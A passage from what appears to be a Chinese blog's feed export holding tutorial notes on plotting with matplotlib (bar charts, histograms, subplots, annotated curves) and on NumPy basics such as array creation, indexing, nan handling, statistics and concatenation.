['10月&#123;&#125;日'.format(i - 50) for i in x_b]# 指定字体路径，然后在需要显示中文的地方添加 fontproperties 参数 my_font = font_manager.FontProperties(fname='/System/Library/Fonts/Pingfang.ttc')plt.xticks(list(x_a) + list(x_b), _x_ticks, rotation = 45, fontproperties = my_font)# 设置x、y轴的labelplt.xlabel('时间', fontproperties = my_font)plt.ylabel('温度', fontproperties = my_font)# 设置图的标题plt.title('3月、10月的温度记录', fontproperties = my_font)plt.show() 条形图bar(竖着的)、barh(横着的)123456789101112131415161718192021222324fig = plt.figure(figsize = (28, 8))# 指定字体路径，然后在需要显示中文的地方添加 fontproperties 参数 my_font = font_manager.FontProperties(fname='/System/Library/Fonts/Pingfang.ttc')a = ["战狼2","速度与激情8","功夫瑜伽","西游伏妖篇","变形金刚5：最后的骑士","摔跤吧！爸爸","加勒比海盗5：死无对证","金刚：骷髅岛","极限特工：终极回归","生化危机6：终章","乘风破浪","神偷奶爸3","智取威虎山","大闹天竺","金刚狼3：殊死一战","蜘蛛侠：英雄归来","悟空传","银河护卫队2","情圣","新木乃伊",]b = [56.01,26.94,17.53,16.49,15.45,12.96,11.8,11.61,11.28,11.12,10.49,10.3,8.75,7.55,7.32,6.99,6.88,6.86,6.58,6.23] # 画竖着的条形图 width 设置条形的宽度 # plt.bar(range(len(a)), b, width = 0.6)# 设置x轴别名# plt.xticks(range(len(a)), a, rotation = 45, fontproperties = my_font)# 画横着的条形图 height 设置条形的宽度plt.barh(range(len(a)), b, height = 0.6)# 设置y轴别名plt.yticks(range(len(a)), a, rotation = 45, fontproperties = my_font)# 设置x、y轴的labelplt.xlabel('电影名称', fontproperties = my_font)plt.ylabel('票房：亿', fontproperties = my_font)# 设置图的标题plt.title('票房记录', fontproperties = my_font)plt.show() 多次条形图假设你知道了列表a中电影分别在2017-09-14(b_14), 2017-09-15(b_15), 2017-09-16(b_16)三天的票房,为了展示列表中电影本身的票房以及同其他电影的数据对比情况,应该如何更加直观的呈现该数据? 12345678910111213141516171819202122232425262728293031fig = plt.figure(figsize = (28, 8))# 指定字体路径，然后在需要显示中文的地方添加 fontproperties 参数 my_font = font_manager.FontProperties(fname='/System/Library/Fonts/Pingfang.ttc')a = ["猩球崛起3：终极之战","敦刻尔克","蜘蛛侠：英雄归来","战狼2"]b_16 = [15746,312,4497,319]b_15 = [12357,156,2045,168]b_14 = [2358,399,2358,362]# 多个条形图根据条形图的宽度错开bar_width = 0.2x_14 = range(len(a))x_15 = [i + bar_width for i in x_14]x_16 = [i + bar_width * 2 for i in x_14]# 画竖着的条形图 width 设置条形的宽度 plt.bar(x_14, b_14, width = bar_width, label = '2017-09-14日')plt.bar(x_15, b_15, width = bar_width, label = '2017-09-15日')plt.bar(x_16, b_16, width = bar_width, label = '2017-09-16日')# 设置图例plt.legend(prop = my_font)# 设置x轴别名plt.xticks(x_15, a, rotation = 45, fontproperties = my_font)# 设置x、y轴的labelplt.xlabel('电影名称', fontproperties = my_font)plt.ylabel('票房：亿', fontproperties = my_font)# 设置图的标题plt.title('票房记录', fontproperties = my_font)plt.show() 直方图hist123456789101112131415161718192021fig = plt.figure(figsize = (28, 8))# 指定字体路径，然后在需要显示中文的地方添加 fontproperties 参数 my_font = font_manager.FontProperties(fname='/System/Library/Fonts/Pingfang.ttc')a=[131, 98, 125, 131, 124, 139, 131, 117, 128, 108, 135, 138, 131, 102, 107, 114, 119, 128, 121, 142, 127, 130, 124, 101, 110, 116, 117, 110, 128, 128, 115, 99, 136, 126, 134, 95, 138, 117, 111,78, 132, 124, 113, 150, 110, 117, 86, 95, 144, 105, 126, 130,126, 130, 126, 116, 123, 106, 112, 138, 123, 86, 101, 99, 136,123, 117, 119, 105, 137, 123, 128, 125, 104, 109, 134, 125, 127,105, 120, 107, 129, 116, 108, 132, 103, 136, 118, 102, 120, 114,105, 115, 132, 145, 119, 121, 112, 139, 125, 138, 109, 132, 134,156, 106, 117, 127, 144, 139, 139, 119, 140, 83, 110, 102,123,107, 143, 115, 136, 118, 139, 123, 112, 118, 125, 109, 119, 133,112, 114, 122, 109, 106, 123, 116, 131, 127, 115, 118, 112, 135,115, 146, 137, 116, 103, 144, 83, 123, 111, 110, 111, 100, 154,136, 100, 118, 119, 133, 134, 106, 129, 126, 110, 111, 109, 141,120, 117, 106, 149, 122, 122, 110, 118, 127, 121, 114, 125, 126,114, 140, 103, 130, 141, 117, 106, 114, 121, 114, 133, 137, 92,121, 112, 146, 97, 137, 105, 98, 117, 112, 81, 97, 139, 113,134, 106, 144, 110, 137, 137, 111, 104, 117, 100, 111, 101, 110,105, 129, 137, 112, 120, 113, 133, 112, 83, 94, 146, 133, 101,131, 116, 111, 84, 137, 115, 122, 106, 144, 109, 123, 116, 111,111, 133, 150]# 设置组距,这个要求有点高，设置不好图形会偏(要能被max(a) - min(a)整除)bin_width = 6 # 计算组数 num_bins = int((max(a) - min(a))//bin_width)print(num_bins, max(a), min(a), max(a) - min(a))# 绘制直方图，传入数据和组数即可plt.hist(a, num_bins)# 默认绘制的是频数，density = 1 设置成频数# plt.hist(a, num_bins, density = 1)# 也可以通过列表来指定各个组距，通常在组距不均匀的时候使用，长度为组数，值为分组依据# plt.hist(a, [min(a) + i * bin_width for i in range(num_bins)])plt.xticks(list(range(min(a), max(a)))[::bin_width], rotation = 45)plt.grid()plt.show() 13 156 78 78 一页创建多张图 subplot12345678910111213import matplotlib.pyplot as pltimport numpy as npfig = plt.figure()# 图像应该是2×2的（即最多4张图），且当前选中的是4个subplot中的第一个（编号从1开始）ax1 = fig.add_subplot(2, 2, 1)ax2 = fig.add_subplot(2, 2, 2)ax3 = fig.add_subplot(2, 2, 3)# 直方图ax1.hist(np.random.randn(100), bins=20, color='k', alpha=0.3)# 散点图ax2.scatter(np.arange(30), np.arange(30) + 3 * np.random.randn(30))# 在第三张上画图， k-- 表示黑色虚线 k表示黑色 -- 表示虚线ax3.plot(np.random.randn(50).cumsum(), 'k--') [&lt;matplotlib.lines.Line2D at 0x8444080&gt;] 123456# 快速创建一图多张表 figsize 是figure的参数# fig是figure对象 axes 是各个图表列表fig, axes = plt.subplots(2, 3, figsize=(18, 6))print(axes)# subplots_adjues 调整个图表之间的间距plt.subplots_adjust(wspace=0, hspace=0) [[&lt;matplotlib.axes._subplots.AxesSubplot object at 0x000000000907BB70&gt; &lt;matplotlib.axes._subplots.AxesSubplot object at 0x00000000090A4C50&gt; &lt;matplotlib.axes._subplots.AxesSubplot object at 0x00000000090D4208&gt;] [&lt;matplotlib.axes._subplots.AxesSubplot object at 0x00000000090F9780&gt; &lt;matplotlib.axes._subplots.AxesSubplot object at 0x00000000095A2CF8&gt; &lt;matplotlib.axes._subplots.AxesSubplot object at 0x00000000095D32B0&gt;]] 实战1. 导入包12import numpy as npimport matplotlib.pyplot as plt 2. 准备数据12345# 定义数据部分x = np.arange(0., 10, 0.2)y1 = np.cos(x)y2 = np.sin(x)y3 = np.sqrt(x) 3. 绘制基本曲线12345# 使用 plot 函数直接绘制上述函数曲线，可以通过配置 plot 函数参数调整曲线的样式、粗细、颜色、标记等：# 绘制 3 条函数曲线plt.plot(x, y1, color='blue', linewidth=1.5, linestyle='-', marker='.', label=r'$y = cos&#123;x&#125;$')plt.plot(x, y2, color='green', linewidth=1.5, linestyle='-', marker='*', label=r'$y = sin&#123;x&#125;$')plt.plot(x, y3, color='m', linewidth=1.5, linestyle='-', marker='x', label=r'$y = \sqrt&#123;x&#125;$') [&lt;matplotlib.lines.Line2D at 0x8315b00&gt;] 4. 设置坐标轴12345678910111213141516# 坐标轴上移ax = plt.subplot(111)# 去掉右边的边框线ax.spines['right'].set_color('none') # 去掉上边的边框线ax.spines['top'].set_color('none') # 移动下边边框线，相当于移动 X 轴ax.xaxis.set_ticks_position('bottom') # 下边框线移动到 y=0 的位置ax.spines['bottom'].set_position(('data', 0))# 移动左边边框线，相当于移动 y 轴ax.yaxis.set_ticks_position('left')# 左边框线移动到 x=0 的位置ax.spines['left'].set_position(('data', 0)) 1234567# 设置 x, y 轴的刻度取值范围plt.xlim(x.min()*1.1, x.max()*1.1)plt.ylim(-1.5, 4.0)# 设置 x, y 轴的刻度标签值plt.xticks([2, 4, 6, 8, 10], [r'2.0', r'4', r'6', r'8', r'10'])plt.yticks([-1.0, 0.0, 1.0, 2.0, 3.0, 4.0], [r'-1.00', r'0.00', r'1.00', r'2.00', r'3.00', r'4.00']) ([&lt;matplotlib.axis.YTick at 0x7f3fb00&gt;, &lt;matplotlib.axis.YTick at 0x7f3f438&gt;, &lt;matplotlib.axis.YTick at 0x7f5b438&gt;, &lt;matplotlib.axis.YTick at 0x8103940&gt;, &lt;matplotlib.axis.YTick at 0x8103e48&gt;, &lt;matplotlib.axis.YTick at 0x8109390&gt;], &lt;a list of 6 Text yticklabel objects&gt;) 1234# 设置标题、x轴、y轴plt.title(r'$the \ function \ figure \ of \ cos(), \ sin() \ and \ sqrt()$', fontsize=19)plt.xlabel(r'$the \ input \ value \ of \ x$', fontsize=18, labelpad=88.8)plt.ylabel(r'$y = f(x)$', fontsize=18, labelpad=12.5) Text(0, 0.5, &apos;$y = f(x)$&apos;) 5. 设置文字描述、注解12plt.text(4, 1.68, r'$x \in [0.0, \ 10.0]$', color='k', fontsize=15)plt.text(4, 1.38, r'$y \in [-1.0, \ 4.0]$', color='k', fontsize=15) Text(4, 1.38, &apos;$y \\in [-1.0, \\ 4.0]$&apos;) 1234# 特殊点添加注解# 使用散点图放大当前点plt.scatter([8,],[np.sqrt(8),], 50, color ='m')plt.annotate(r'$2\sqrt&#123;2&#125;$', xy=(8, np.sqrt(8)), xytext=(8.5, 2.2), fontsize=16, color='#090909', arrowprops=dict(arrowstyle='-&gt;', connectionstyle='arc3, rad=0.1', color='#090909')) Text(8.5, 2.2, &apos;$2\\sqrt{2}$&apos;) 6. 设置图例1plt.legend(['cos(x)', 'sin(x)', 'sqrt(x)'], loc='upper right') &lt;matplotlib.legend.Legend at 0x9495c88&gt; 7. 网格线开关12# 显示网格线plt.grid(True) 8. 显示12# 显示plt.show() 完整的绘制程序123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960import numpy as npimport matplotlib.pyplot as plt# 定义数据部分x = np.arange(0., 10, 0.2)y1 = np.cos(x)y2 = np.sin(x)y3 = np.sqrt(x)# 绘制 3 条函数曲线plt.plot(x, y1, color='blue', linewidth=1.5, linestyle='-', marker='.', label=r'$y = cos&#123;x&#125;$')plt.plot(x, y2, color='green', linewidth=1.5, linestyle='-', marker='*', label=r'$y = sin&#123;x&#125;$')plt.plot(x, y3, color='m', linewidth=1.5, linestyle='-', marker='x', label=r'$y = \sqrt&#123;x&#125;$')# 坐标轴上移ax = plt.subplot(111)ax.spines['right'].set_color('none') # 去掉右边的边框线ax.spines['top'].set_color('none') # 去掉上边的边框线# 移动下边边框线，相当于移动 X 轴ax.xaxis.set_ticks_position('bottom') # 下边框线移动到 y=0 的位置ax.spines['bottom'].set_position(('data', 0))# 移动左边边框线，相当于移动 y 轴ax.yaxis.set_ticks_position('left')# 左边框线移动到 x=0 的位置ax.spines['left'].set_position(('data', 0))# 设置 x, y 轴的取值范围plt.xlim(x.min()*1.1, x.max()*1.1)plt.ylim(-1.5, 4.0)# 设置 x, y 轴的刻度值plt.xticks([2, 4, 6, 8, 10], [r'2', r'4', r'6', r'8', r'10'])plt.yticks([-1.0, 0.0, 1.0, 2.0, 3.0, 4.0], [r'-1.0', r'0.0', r'1.0', r'2.0', r'3.0', r'4.0'])# 添加文字plt.text(4, 1.68, r'$x \in [0.0, \ 10.0]$', color='k', fontsize=15)plt.text(4, 1.38, r'$y \in [-1.0, \ 4.0]$', color='k', fontsize=15)# 特殊点添加注解plt.scatter([8,],[np.sqrt(8),], 50, color ='m') # 使用散点图放大当前点plt.annotate(r'$2\sqrt&#123;2&#125;$', xy=(8, np.sqrt(8)), xytext=(8.5, 2.2), fontsize=16, color='#090909', arrowprops=dict(arrowstyle='-&gt;', connectionstyle='arc3, rad=0.1', color='#090909'))# 设置标题、x轴、y轴plt.title(r'$the \ function \ figure \ of \ cos(), \ sin() \ and \ sqrt()$', fontsize=19)plt.xlabel(r'$the \ input \ value \ of \ x$', fontsize=18, labelpad=88.8)plt.ylabel(r'$y = f(x)$', fontsize=18, labelpad=12.5)# 设置图例及位置plt.legend(loc='up right') # plt.legend(['cos(x)', 'sin(x)', 'sqrt(x)'], loc='up right')# 显示网格线plt.grid(True) # 显示绘图plt.show() 参考官方案例 12]]></content>
      <categories>
        <category>数据分析</category>
        <category>matplotlib</category>
      </categories>
      <tags>
        <tag>matplotlib</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Numpy 基础]]></title>
    <url>%2F2019%2F04%2F11%2F%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90%2FNumPy%20%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[Numpy 文档Numpy 常用的运算方法 12import numpy as npimport random numpy 比原生的 python 计算更省资源、速度更快12my_arr = np.arange(1000000)my_list = list(range(1000000)) 1%time for _ in range(10): my_arr2 = my_arr * 2 Wall time: 20 ms 1%time for _ in range(10): my_list2 = [x * 2 for x in my_list] Wall time: 969 ms 创建数组 ndarrayarray、arange 方法创建数组12345678910# 创建数据类型为ndarray的数组t1 = np.array([1, 2, 3])print(t1, type(t1))t2 = np.array(range(10))print(t2)# 和range用法一样，快速生成一个数组t3 = np.arange(10)print(t3) [1 2 3] &lt;class &apos;numpy.ndarray&apos;&gt; [0 1 2 3 4 5 6 7 8 9] [0 1 2 3 4 5 6 7 8 9] 12# 获取数组的数据类型t3.dtype dtype(&apos;int64&apos;) 数据类型1234# dtype 创建数组指定数据类型t4 = np.array(range(10), dtype='float')# 获取数据的数据类型t4.dtype dtype(&apos;float64&apos;) 123# 更改数组的数据类型t5 = t4.astype('int8')t5 array([0, 1, 2, 3, 4, 5, 6, 7, 8, 9], dtype=int8) 1t4.astype(np.int8) array([0, 1, 2, 3, 4, 5, 6, 7, 8, 9], dtype=int8) 数据类型列表 类型 类型代码 说明 int8\uint8 i1\u1 有符号\无符号的 8 位（1 字节）整数 int16\uint16 i1\u1 有符号\无符号的 16 位（2 字节）整数 int32\uint32 i1\u1 有符号\无符号的 32 位（4 字节）整数 int64\uint64 i1\u1 有符号\无符号的 64 位（8 字节）整数 float16 f2 半精度浮点数 float32 f4或f 标准单精度浮点数。与 C 的 float 兼容 float64 f8或d 标准双精度浮点数。与 C 的 double 和 python 的 float 兼容 float128 f16或g 扩展精度浮点数 complex64\complex128\complex256 c8\c16\c32 分别用两个 32 位、64 位、128 为的浮点数表示复数 bool ? 存储 True 和 False 值的布尔类型 object O Python 对象类型 string_ S 固定长度的字符串类型(每个字符 1 个字节)。例如，要创建一个长度为 10 的字符串，使用 S10 unicode_ U 固定长度的 unicode 类型(字节数由平台决定)。跟字符串一样，如 U10 创建多维数组12t11 = np.array([[1, 2, 3], [4, 5, 6]])t11 array([[1, 2, 3], [4, 5, 6]]) 获取数组的形状 shape12# 获取数组的形状t11.shape (2, 3) 改变数组的形状 reshape、flatten、ravel123# reshape 改变数组的形状t12 = np.arange(24).reshape(2, 3, 4)t12 array([[[ 0, 1, 2, 3], [ 4, 5, 6, 7], [ 8, 9, 10, 11]], [[12, 13, 14, 15], [16, 17, 18, 19], [20, 21, 22, 23]]]) 123# flatten多维释放成一维t13 = t12.flatten()t13 array([ 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23]) 12# 拉伸成一维t12.ravel() array([ 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23]) 创建全是 0 的数组123# 创建全是0的数组t15 = np.zeros((3, 4))t15 array([[0., 0., 0., 0.], [0., 0., 0., 0.], [0., 0., 0., 0.]]) 1np.zeros(10) array([0., 0., 0., 0., 0., 0., 0., 0., 0., 0.]) 创建全是 1 的数组123# 创建全是1的数组t16 = np.ones((3, 4))t16 array([[1., 1., 1., 1.], [1., 1., 1., 1.], [1., 1., 1., 1.]]) 1np.ones(10) array([1., 1., 1., 1., 1., 1., 1., 1., 1., 1.]) 创建一个对角线为 1 的正方形数组(方阵)123# 创建一个对角线为1的正方形数组(方阵)t17 = np.eye(3)t17 array([[1., 0., 0.], [0., 1., 0.], [0., 0., 1.]]) 创建空数组 emptyempty 只是分配了空间并未填充任何的值，下面看到的值可以理解成历史数据 1np.empty(5) array([2.15968811e-316, 0.00000000e+000, 2.37986283e-316, 2.39281447e-316, 1.35807731e-312]) 1np.empty((2, 3)) array([[1.12409068, 0.71737825, 1.91333048], [0.95169061, 1.36121775, 1.16378946]]) 创建填充指定值的数组1np.full(5, fill_value=2) array([2, 2, 2, 2, 2]) 1np.full((2, 3), fill_value=3) array([[3, 3, 3], [3, 3, 3]]) 生成随机的数组12data = np.random.randn(2, 3)data array([[-1.12409068, -0.71737825, -1.91333048], [-0.95169061, -1.36121775, 1.16378946]]) 1np.random.randn(10) array([-0.09859757, -1.94489982, -0.2328898 , 1.21339405, -2.6686755 , 1.01910496, 0.39283428, -0.74445077, 0.16423021, -0.71799976]) 123# 用normal来得到一个标准正态分布的4×4样本数组samples = np.random.normal(size = (4, 4))samples array([[ 1.38710548, -0.99141781, -0.01657807, 0.28104076], [-0.72489278, 0.14099596, -0.61639653, 1.31648008], [ 0.12896794, -0.31226401, 1.64074497, 0.18071008], [ 0.30653902, 1.42660833, -0.63305582, 3.74709392]]) 随机方法列表 函数 说明 seed 确定随机数生成器的种子，让每次随机数据一样 permutation 返回一个序列的随机排列或返回一个随机排列的范围 shuffle 对一个序列就地随机排列 rand 产生均匀分布的样本值 randint 从给定的上下限范围内随机选取整数 randn 产生正态分布（平均值为 0，标准差为 1）的样本值，类似于 MATLAB 接口 binomial 产生二项分布的样本值 normal 产生正态（高斯）分布的样本值 beta 产生 Beta 分布的样本值 chisquare 产生卡方分布的样本值 gamma 产生 Gamma 分布的样本值 uniform 产生在 [0, 1) 中均匀分布的样本值 转置（交换轴）转置就是交换轴 12t = np.arange(24).reshape(4, 6)t array([[ 0, 1, 2, 3, 4, 5], [ 6, 7, 8, 9, 10, 11], [12, 13, 14, 15, 16, 17], [18, 19, 20, 21, 22, 23]]) 12# 转置t.T array([[ 0, 6, 12, 18], [ 1, 7, 13, 19], [ 2, 8, 14, 20], [ 3, 9, 15, 21], [ 4, 10, 16, 22], [ 5, 11, 17, 23]]) 12# 转置方法t.transpose() array([[ 0, 6, 12, 18], [ 1, 7, 13, 19], [ 2, 8, 14, 20], [ 3, 9, 15, 21], [ 4, 10, 16, 22], [ 5, 11, 17, 23]]) 1234567# 转换高纬# 创建三维数据arr = np.arange(16).reshape(2,2,4)print(arr, arr.shape)# 转置arr.transpose((1,0,2)) [[[ 0 1 2 3] [ 4 5 6 7]] [[ 8 9 10 11] [12 13 14 15]]] (2, 2, 4) array([[[ 0, 1, 2, 3], [ 8, 9, 10, 11]], [[ 4, 5, 6, 7], [12, 13, 14, 15]]]) 12# 交换轴t.swapaxes(1, 0) array([[ 0, 6, 12, 18], [ 1, 7, 13, 19], [ 2, 8, 14, 20], [ 3, 9, 15, 21], [ 4, 10, 16, 22], [ 5, 11, 17, 23]]) 索引与切片12t31 = np.arange(24).reshape(4, 6)t31 array([[ 0, 1, 2, 3, 4, 5], [ 6, 7, 8, 9, 10, 11], [12, 13, 14, 15, 16, 17], [18, 19, 20, 21, 22, 23]]) 选取行12# 获取第二行t31[1] array([ 6, 7, 8, 9, 10, 11]) 123# 取多行# 取第二行到第四行t31[1:4] array([[ 6, 7, 8, 9, 10, 11], [12, 13, 14, 15, 16, 17], [18, 19, 20, 21, 22, 23]]) 123# 取不连续的多行# 取第一行和第四行t31[[1,3]] array([[ 6, 7, 8, 9, 10, 11], [18, 19, 20, 21, 22, 23]]) 选取列12# 获取第二列t31[:,1] array([ 1, 7, 13, 19]) 123# 取多列# 取第二列到第四列t31[:,1:4] array([[ 1, 2, 3], [ 7, 8, 9], [13, 14, 15], [19, 20, 21]]) 123# 取不连续的多列# 取第一列和第四列t31[:, [1, 3]] array([[ 1, 3], [ 7, 9], [13, 15], [19, 21]]) 选取点123# 取指定的索引值# 取第二行第二列的值t31[1,1] 7 12# 取(1, 1), (3, 3)点的值t31[[1, 3], [1, 3]] array([ 7, 21]) 修改数值可以对索引获取到的值进行修改 1t31 array([[ 0, 1, 2, 3, 4, 5], [ 6, 7, 8, 9, 10, 11], [12, 13, 14, 15, 16, 17], [18, 19, 20, 21, 22, 23]]) 123# 把第一列修改为 0t31[:, 1] = 0t31 array([[ 0, 0, 2, 3, 4, 5], [ 6, 0, 8, 9, 10, 11], [12, 0, 14, 15, 16, 17], [18, 0, 20, 21, 22, 23]]) 布尔索引1t31 array([[ 3, 3, 3, 3, 4, 5], [ 6, 7, 8, 9, 10, 11], [12, 13, 14, 15, 16, 17], [18, 19, 20, 21, 22, 23]]) 12# 获取判读小于 3 的数组t31 &lt; 3 array([[False, False, False, False, False, False], [False, False, False, False, False, False], [False, False, False, False, False, False], [False, False, False, False, False, False]]) 1234# 根据布尔数组，获取为 True 的数据# 给小于3的赋值为3t31[t31 &lt; 3] = 3t31 array([[ 3, 3, 3, 3, 4, 5], [ 6, 7, 8, 9, 10, 11], [12, 13, 14, 15, 16, 17], [18, 19, 20, 21, 22, 23]]) 三元运算 where12t32 = np.arange(24).reshape(4, 6)t32 array([[ 0, 1, 2, 3, 4, 5], [ 6, 7, 8, 9, 10, 11], [12, 13, 14, 15, 16, 17], [18, 19, 20, 21, 22, 23]]) 12# 把小于等于 10 的替换成 0 ，大于 10 的替换成 20np.where(t32 &gt; 10, 20, 0) array([[ 0, 0, 0, 0, 0, 0], [ 0, 0, 0, 0, 0, 20], [20, 20, 20, 20, 20, 20], [20, 20, 20, 20, 20, 20]]) 裁剪 clip把小于某值的改成某值、把大于某值的改成某值 12t33 = np.arange(24).reshape(4, 6)t33 array([[ 0, 1, 2, 3, 4, 5], [ 6, 7, 8, 9, 10, 11], [12, 13, 14, 15, 16, 17], [18, 19, 20, 21, 22, 23]]) 12# 把小于10的替换成10， 大于18的替换成18t33.clip(10, 18) array([[10, 10, 10, 10, 10, 10], [10, 10, 10, 10, 10, 11], [12, 13, 14, 15, 16, 17], [18, 18, 18, 18, 18, 18]]) 1234# 由于 np.nan 是一个浮点型，所以要把数组改变成浮点型才能赋值成功t34 = np.arange(24).reshape(4, 6).astype('float')t34[t34 &gt; 20] = np.nant34 array([[ 0., 1., 2., 3., 4., 5.], [ 6., 7., 8., 9., 10., 11.], [12., 13., 14., 15., 16., 17.], [18., 19., 20., nan, nan, nan]]) 12# 把小于 10 的替换成 10 ，大于 18 的替换成 18 ，nan 并没有改变，非数值类型无法计算和判断t34.clip(10, 18) array([[10., 10., 10., 10., 10., 10.], [10., 10., 10., 10., 10., 11.], [12., 13., 14., 15., 16., 17.], [18., 18., 18., nan, nan, nan]]) 非数值 nan 和无穷 infnan 表示非数值类型，inf 表示正无穷，-inf 表示负无穷；这俩都是 float 类型的 1type(np.nan) float 1type(np.inf) float nan和任何数值计算都是nan，nan不等于nan，判断是否是nan可以用 isnan() 1np.nan != np.nan True 12t35 = np.array([1., 3. , np.nan])t35 array([ 1., 3., nan]) 12# 根据 nan != nan 的特性来获取是 nan 的布尔数组t35 != t35 array([False, False, True]) 123# 计算 nan 个数# count_nonzero 计算非 0 的个数np.count_nonzero(t35 != t35) 1 12# 获取是否是 nan 的布尔数组np.isnan(t35) array([False, False, True]) 123# 把 nan 替换成 0t35[np.isnan(t35)] = 0t35 array([1., 3., 0.]) 数学运算numpy 的计算有个广播效应，会逐个元素、逐行、逐列进行计算 12x = np.array([[1,2],[3,4]], dtype=np.float64)x array([[1., 2.], [3., 4.]]) 12y = np.array([[5,6],[7,8]], dtype=np.float64)y array([[5., 6.], [7., 8.]]) 12z = np.array([2, 3])z array([2, 3]) 逐元素求和1x + 10 array([[11., 12.], [13., 14.]]) 1x + y array([[ 6., 8.], [10., 12.]]) 1np.add(x,y) array([[ 6., 8.], [10., 12.]]) 1x + z array([[3., 5.], [5., 7.]]) 逐元素作差1x - 10 array([[-9., -8.], [-7., -6.]]) 1x - y array([[-4., -4.], [-4., -4.]]) 1np.subtract(x,y) array([[-4., -4.], [-4., -4.]]) 1x - z array([[-1., -1.], [ 1., 1.]]) 逐元素相乘1x * 10 array([[10., 20.], [30., 40.]]) 1x * y array([[ 5., 12.], [21., 32.]]) 1np.multiply(x,y) array([[ 5., 12.], [21., 32.]]) 1x * z array([[ 2., 6.], [ 6., 12.]]) 逐元素相除1x / 10 array([[0.1, 0.2], [0.3, 0.4]]) 1np.divide(x, y) array([[0.2 , 0.33333333], [0.42857143, 0.5 ]]) 逐元素求平方根12# 求平方根np.sqrt(x) array([[1. , 1.41421356], [1.73205081, 2. ]]) 看图理解广播效应 统计函数12t41 = np.arange(24).reshape(4, 6)t41 array([[ 0, 1, 2, 3, 4, 5], [ 6, 7, 8, 9, 10, 11], [12, 13, 14, 15, 16, 17], [18, 19, 20, 21, 22, 23]]) 求和12# 求所有的和np.sum(t41) 276 1t41.sum() 276 123# 求某一轴上的和# 求0轴(x轴)上的和 竖着求和t41.sum(axis = 0) array([36, 40, 44, 48, 52, 56]) 1np.sum(t41, axis = 0) array([36, 40, 44, 48, 52, 56]) 累加 cumsum12draws = np.random.randint(0, 2, size=10)draws array([0, 0, 1, 0, 0, 1, 0, 0, 1, 0]) 12steps = np.where(draws &gt; 0, 1, -1)steps array([-1, -1, 1, -1, -1, 1, -1, -1, 1, -1]) 1steps.cumsum() array([-1, -2, -1, -2, -3, -2, -3, -4, -3, -4], dtype=int32) 求均值12# 求所有的均值np.mean(t41) 11.5 1t41.mean() 11.5 123# 求某一轴上的均值# 求0轴(x轴)上的均值 竖着求均值t41.mean(axis = 0) array([ 9., 10., 11., 12., 13., 14.]) 1np.mean(t41, axis = 0) array([ 9., 10., 11., 12., 13., 14.]) 求中值12# 求所有的中值np.median(t41) 11.5 12# 求0轴(x轴)上的中值 竖着求中值np.median(t41, axis = 0) array([ 9., 10., 11., 12., 13., 14.]) 求最大值、最小值12# 求所有的最大值np.max(t41) 23 1t41.max() 23 123# 求某一轴上的最大值# 求0轴(x轴)上的最大值 竖着求np.max(t41, axis = 0) array([18, 19, 20, 21, 22, 23]) 1t41.max(axis = 0) array([18, 19, 20, 21, 22, 23]) 12# 求所有的最小值np.min(t41) 0 1t41.min() 0 123# 求某一轴上的最小值# 求0轴(x轴)上的最小值 竖着求np.min(t41, axis = 0) array([0, 1, 2, 3, 4, 5]) 1t41.min(axis = 0) array([0, 1, 2, 3, 4, 5]) 求极值最大值 减去 最小值 12# 求所有数据的极值np.ptp(t41) 23 1t41.ptp() 23 123# 求某一轴上的极值# 求0轴(x轴)上的极值np.ptp(t41, axis = 0) array([18, 18, 18, 18, 18, 18]) 1t41.ptp(axis = 0) array([18, 18, 18, 18, 18, 18]) 求标准差12# 求所有数据的标准差np.std(t41) 6.922186552431729 1t41.std() 6.922186552431729 123# 求某一轴上的标准差# 求0轴(x轴)上的标准差np.std(t41, axis = 0) array([6.70820393, 6.70820393, 6.70820393, 6.70820393, 6.70820393, 6.70820393]) 1t41.std(axis = 0) array([6.70820393, 6.70820393, 6.70820393, 6.70820393, 6.70820393, 6.70820393]) 缺失值填充均值12t42 = np.arange(24).reshape(4, 6).astype('float')t42 array([[ 0., 1., 2., 3., 4., 5.], [ 6., 7., 8., 9., 10., 11.], [12., 13., 14., 15., 16., 17.], [18., 19., 20., 21., 22., 23.]]) 12t42[[1,3], [1, 3]] = np.nant42 array([[ 0., 1., 2., 3., 4., 5.], [ 6., nan, 8., 9., 10., 11.], [12., 13., 14., 15., 16., 17.], [18., 19., 20., nan, 22., 23.]]) 12# 获取到nant42[:, 1][t42[:, 1] != t42[:, 1]] array([nan]) 12# 获取到nan的数量np.count_nonzero(t42[:, 1][t42[:, 1] != t42[:, 1]]) 1 1234567891011121314def fill_nan_by_column_mean(t): for i in range(t.shape[1]): nan_num = np.count_nonzero(t[:, i][t[:, i] != t[:, i]]) # 如果存在nan if nan_num &gt; 0: now_col = t[:, i] # 计算非nan的和 now_col_not_nan = now_col[np.isnan(now_col) == False].sum() # 计算平均数 now_col_mean = now_col_not_nan / (t.shape[0] - nan_num) # 给nan赋值平均数 now_col[np.isnan(now_col)] = now_col_mean # 更新列 t[:, i] = now_col 12fill_nan_by_column_mean(t42)t42 array([[ 0., 1., 2., 3., 4., 5.], [ 6., 11., 8., 9., 10., 11.], [12., 13., 14., 15., 16., 17.], [18., 19., 20., 9., 22., 23.]]) 数组的拼接 concatenate、vstack、hstack123import numpy as npt51 = np.arange(12).reshape(2, 6)t51 array([[ 0, 1, 2, 3, 4, 5], [ 6, 7, 8, 9, 10, 11]]) 12t52 = np.arange(12, 24).reshape(2, 6)t52 array([[12, 13, 14, 15, 16, 17], [18, 19, 20, 21, 22, 23]]) 竖直、横向拼接 concatenate12# 竖直拼接np.concatenate([t51, t52], axis=0) array([[ 0, 1, 2, 3, 4, 5], [ 6, 7, 8, 9, 10, 11], [12, 13, 14, 15, 16, 17], [18, 19, 20, 21, 22, 23]]) 12# 横向拼接np.concatenate([t51, t52], axis=1) array([[ 0, 1, 2, 3, 4, 5, 12, 13, 14, 15, 16, 17], [ 6, 7, 8, 9, 10, 11, 18, 19, 20, 21, 22, 23]]) 竖直拼接 vstack12# 竖直拼接 np.vstack((t51, t52)) array([[ 0, 1, 2, 3, 4, 5], [ 6, 7, 8, 9, 10, 11], [12, 13, 14, 15, 16, 17], [18, 19, 20, 21, 22, 23]]) 横向拼接 